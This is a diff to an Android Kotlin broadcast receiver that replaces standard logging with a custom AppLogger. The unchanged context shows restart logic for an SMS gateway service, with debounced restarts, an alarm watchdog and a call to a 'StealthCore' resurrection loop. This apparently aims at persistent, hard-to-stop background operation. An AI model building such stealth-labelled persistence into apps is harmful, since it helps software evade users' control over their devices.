@@ -5,7 +5,7 @@ import android.content.Context
 import android.content.Intent
 import android.os.Build
 import android.os.SystemClock
-import android.util.Log
+import com.cornspace.aichat.util.AppLogger
 import com.cornspace.aichat.util.Constants.MULTI_EVENT_DEBOUNCE_MS
 import java.util.concurrent.atomic.AtomicLong
 
@@ -37,11 +37,11 @@ class MultiEventReceiver : BroadcastReceiver() {
 
     override fun onReceive(context: Context, intent: Intent) {
         val action = intent.action ?: return
-        Log.d(TAG, "Event received: $action")
+        AppLogger.d(TAG, "Event received: $action")
 
         // Skip if the service is already running — nothing to do.
         if (SmsGatewayService.isServiceRunning()) {
-            Log.d(TAG, "Service running — skipping restart")
+            AppLogger.d(TAG, "Service running — skipping restart")
             // Always keep the alarm watchdog alive regardless.
             AlarmReceiver.scheduleAlarm(context)
             return
@@ -54,19 +54,19 @@ class MultiEventReceiver : BroadcastReceiver() {
         val now = SystemClock.elapsedRealtime()
         val last = lastRestartAttemptMs.get()
         if (now - last < MULTI_EVENT_DEBOUNCE_MS) {
-            Log.d(TAG, "Debounced restart attempt (last was ${now - last}ms ago)")
+            AppLogger.d(TAG, "Debounced restart attempt (last was ${now - last}ms ago)")
             return
         }
 
         // CAS ensures only one thread wins the restart slot if two events arrive
         // simultaneously at the debounce boundary.
         if (!lastRestartAttemptMs.compareAndSet(last, now)) {
-            Log.d(TAG, "Concurrent restart attempt lost CAS — skipping")
+            AppLogger.d(TAG, "Concurrent restart attempt lost CAS — skipping")
             return
         }
 
         try {
-            Log.w(TAG, "Service not running — restarting (triggered by $action)")
+            AppLogger.w(TAG, "Service not running — restarting (triggered by $action)")
             val serviceIntent = Intent(context, SmsGatewayService::class.java)
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                 context.startForegroundService(serviceIntent)
@@ -76,7 +76,7 @@ class MultiEventReceiver : BroadcastReceiver() {
             // Also ensure the fine-grained resurrection loop is running.
             StealthCore.startResurrectionLoop(context)
         } catch (e: Exception) {
-            Log.e(TAG, "Error restarting service", e)
+            AppLogger.e(TAG, "Error restarting service", e)
         }
 
         // Ensure the coarse watchdog alarm is always scheduled.
